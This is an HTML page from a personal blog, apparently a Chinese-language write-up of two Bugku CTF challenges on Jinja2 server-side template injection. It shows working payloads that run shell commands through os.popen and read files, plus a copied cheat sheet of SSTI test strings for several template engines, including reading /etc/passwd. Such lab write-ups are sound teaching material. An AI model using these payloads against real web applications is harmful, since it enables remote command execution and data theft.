@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/blog.svg" color="#222">
+  <meta name="google-site-verification" content="bTjCFuS-USBNY2lXWzFY1_LfmhTznxTtKdaLX9hEgdg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ysfhtxn.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":{"disqusjs":{"text":"Disqus","order":-1}},"activeClass":"disqusjs"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Simple_SSTI_1题目描述没有描述，题目描述与题目名称一致。 解决过程首先进入环境，发现仅有一句话：  F12查看元素，发现一具友好的注释 1&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bugku的Simple_SSTI_1&amp;2">
+<meta property="og:url" content="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/index.html">
+<meta property="og:site_name" content="xyzc&#39;s blog">
+<meta property="og:description" content="Simple_SSTI_1题目描述没有描述，题目描述与题目名称一致。 解决过程首先进入环境，发现仅有一句话：  F12查看元素，发现一具友好的注释 1&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/image-20231105014117763.png">
+<meta property="og:image" content="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/image-20231105014126054.png">
+<meta property="og:image" content="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/image-20231105014134737.png">
+<meta property="article:published_time" content="2023-11-04T15:34:45.000Z">
+<meta property="article:modified_time" content="2023-11-04T15:34:45.000Z">
+<meta property="article:author" content="xyzc">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Chinese">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/image-20231105014117763.png">
+
+<link rel="canonical" href="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>bugku的Simple_SSTI_1&2 | xyzc's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xyzc's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">emm...</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section">About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section">Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section">Friends</a>
+
+  </li>
+        <li class="menu-item menu-item-publication">
+
+    <a href="/publication/" rel="section">Publication</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="xyzc">
+      <meta itemprop="description" content="人生到处知何似，应似飞鸿踏雪泥。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xyzc's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bugku的Simple_SSTI_1&2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-04 23:34:45" itemprop="dateCreated datePublished" datetime="2023-11-04T23:34:45+08:00">2023-11-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a><a href="httpsctf.bugku.comchallengesdetailid196.html">Simple_SSTI_1</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>没有描述，题目描述与题目名称一致。</p>
+<h3 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h3><p>首先进入环境，发现仅有一句话：</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014117763.png" alt="image-20231105014117763"></p>
+<p>F12查看元素，发现一具友好的注释</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>简单的模板注入。</p>
+<p>结合两处信息，提交flag：</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014126054.png" alt="image-20231105014126054"></p>
+<p>即可得到<code>flag&#123;f55da1a9d9333c39872e420b76d7e3f2&#125;</code></p>
+<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a><a href="httpsctf.bugku.comchallengesdetailid203.html">Simple_SSTI_2</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>没有描述，题目描述与题目名称一致。</p>
+<h3 id="解决过程-1"><a href="#解决过程-1" class="headerlink" title="解决过程"></a>解决过程</h3><p>进入环境，页面显示与Simple_SSTI_1一致，但网页元素却有了区别</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Simple SSTI2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">You need pass in a parameter named flag</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题没有任何提示，尝试使用Simple_SSTI_1的解法，构建<code>http114.67.175.22415921flag=&#123;&#123;config&#125;&#125;</code>，返回如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;<span class="string">&#x27;ENV&#x27;</span>: <span class="string">&#x27;production&#x27;</span>, <span class="string">&#x27;DEBUG&#x27;</span>: True, <span class="string">&#x27;TESTING&#x27;</span>: False, <span class="string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: None, <span class="string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: None, <span class="string">&#x27;SECRET_KEY&#x27;</span>: None, <span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=31), <span class="string">&#x27;USE_X_SENDFILE&#x27;</span>: False, <span class="string">&#x27;SERVER_NAME&#x27;</span>: None, <span class="string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: None, <span class="string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: None, <span class="string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: True, <span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: False, <span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: None, <span class="string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: True, <span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: None, <span class="string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: datetime.timedelta(seconds=43200), <span class="string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: None, <span class="string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: False, <span class="string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: False, <span class="string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;JSON_AS_ASCII&#x27;</span>: True, <span class="string">&#x27;JSON_SORT_KEYS&#x27;</span>: True, <span class="string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: False, <span class="string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: None, <span class="string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: 4093&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>并没有特殊之处。</p>
+<p>构建<code>http://114.67.175.224:15921/?flag=&#123;&#123;13&#125;&#125;</code>得到返回 <code>13</code>，并且想到题目说SSTI漏洞，可以考虑构建命令注入查看文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">或</span><br><span class="line">http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回了</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014134737.png" alt="image-20231105014134737"></p>
+<p>看到了flag，更换命令重新注入</p>
+<p><code>http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()&#125;&#125;</code></p>
+<p>得到<code>flag&#123;69f88b1ab5884cd258662ac7a3fe02d8&#125;</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h3><p>SSTI （Server-Side Template Injection），即模板注入。</p>
+<p> 模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
+<h3 id="常见的测试用例-（转自Web安全学习笔记）"><a href="#常见的测试用例-（转自Web安全学习笔记）" class="headerlink" title="常见的测试用例 （转自Web安全学习笔记）"></a>常见的测试用例 （转自<a href="httpswebsec.readthedocs.iozhlatestvulnssti.html">Web安全学习笔记</a>）</h3><ul>
+<li><p>简单数学表达式 <code>&#123;&#123; 1+1 &#125;&#125; </code></p>
+</li>
+<li><p>字符串表达式 <code>&#123;&#123;'test'&#125;&#125;</code></p>
+</li>
+<li><p>Flask  Jinja2（本题为Jinja2）<br> <code>&#123;&#123; config &#125;&#125;</code><br> <code>&#123;&#123; config.items() &#125;&#125;</code><br> <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br> <code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code><br> <code>&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;</code><br> <code>&#123;&#123; request.__init__.__globals__['__builtins__'].open('etcpasswd').read() &#125;&#125;</code></p>
+</li>
+<li><p>Django</p>
+<ul>
+<li><code>&#123;&#123; request &#125;&#125;</code></li>
+<li><code>&#123;% debug %&#125;</code></li>
+<li><code>&#123;% load module %&#125;</code></li>
+<li><code>&#123;% include x.html %&#125;</code></li>
+<li><code>&#123;% extends x.html %&#125;</code></li>
+</ul>
+</li>
+<li><p>Ruby</p>
+<ul>
+<li><code>&lt;%= 7 * 7 %&gt;</code></li>
+<li><code>&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;</code></li>
+</ul>
+</li>
+<li><p>Java</p>
+<ul>
+<li><code>$&#123;77&#125;</code></li>
+</ul>
+</li>
+<li><p>Twig</p>
+<ul>
+<li><code>&#123;&#123;77&#125;&#125;</code></li>
+</ul>
+</li>
+<li><p>Smarty</p>
+<ul>
+<li><code>&#123;php&#125;echo `id`;&#123;php&#125;</code></li>
+</ul>
+</li>
+<li><p>AngularJS</p>
+<ul>
+<li><code>$eval(&#39;1+1&#39;)</code></li>
+</ul>
+</li>
+<li><p>Tornado</p>
+<ul>
+<li>引用模块 <code>&#123;% import module %&#125;</code></li>
+<li>&#x3D; <code>&#123;% import os %&#125;&#123;&#123; os.popen(whoami).read() &#125;&#125;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="class-和-name"><a href="#class-和-name" class="headerlink" title="__class__和__name__"></a><code>__class__</code>和<code>__name__</code></h3><p>实例对象调用<code>__class__</code>时会指向该实例的类，<code>__name__</code>可用来获取类名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class TEST():</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...             <span class="built_in">print</span>(self.__class__)</span><br><span class="line">...             <span class="built_in">print</span>(self.__class__.__name__)</span><br><span class="line">&gt;&gt;&gt; a = TEST()</span><br><span class="line">&lt;class <span class="string">&#x27;__main__.TEST&#x27;</span>&gt;</span><br><span class="line">TEST</span><br><span class="line">&gt;&gt;&gt; a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(a.__class__)</span><br><span class="line">&lt;class <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(a.__class__.__name__)</span><br><span class="line">str</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Chinese/" rel="tag"># Chinese</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/17/67482b2d150d/" rel="prev" title="How to count the nanopore error rate from the fastq file">
+      <i class="fa fa-chevron-left"></i> How to count the nanopore error rate from the fastq file
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/06/0e69a46d245f/" rel="next" title="Typora+hexo+GithubActions">
+      Typora+hexo+GithubActions <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-SSTI-1"><span class="nav-number">1.</span> <span class="nav-text">Simple_SSTI_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">解决过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-SSTI-2"><span class="nav-number">2.</span> <span class="nav-text">Simple_SSTI_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B-1"><span class="nav-number">2.2.</span> <span class="nav-text">解决过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSTI"><span class="nav-number">3.1.</span> <span class="nav-text">什么是SSTI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B-%EF%BC%88%E8%BD%AC%E8%87%AAWeb%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">常见的测试用例 （转自Web安全学习笔记）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#class-%E5%92%8C-name"><span class="nav-number">3.3.</span> <span class="nav-text">__class__和__name__</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xyzc"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">xyzc</p>
+  <div class="site-description" itemprop="description">人生到处知何似，应似飞鸿踏雪泥。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/zhaoxuyang2000@gmail.com" title="E-Mail → zhaoxuyang2000@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/JThebestxd" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;JThebestxd" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.youtube.com/@xvyang/featured" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@xvyang&#x2F;featured" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://scholar.google.com/citations?user=c-e0S4IAAAAJ" title="Google Scholar → https:&#x2F;&#x2F;scholar.google.com&#x2F;citations?user&#x3D;c-e0S4IAAAAJ" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google Scholar</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xyzc</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">36k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : '' || 'https://disqus.com/api/',
+      apikey    : 'JYiIPwlOB9U3Yebvo5KcugC5zExHC9OVuxYxTShMTmJLpyY73i75drUbXuXdMGr1',
+      shortname : 'ysfhtxn',
+      url       : "https://ysfhtxn.github.io/2023/11/04/d308653fd0c0/",
+      identifier: "2023/11/04/d308653fd0c0/",
+      title     : "bugku的Simple_SSTI_1&2",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+</body>
+</html>
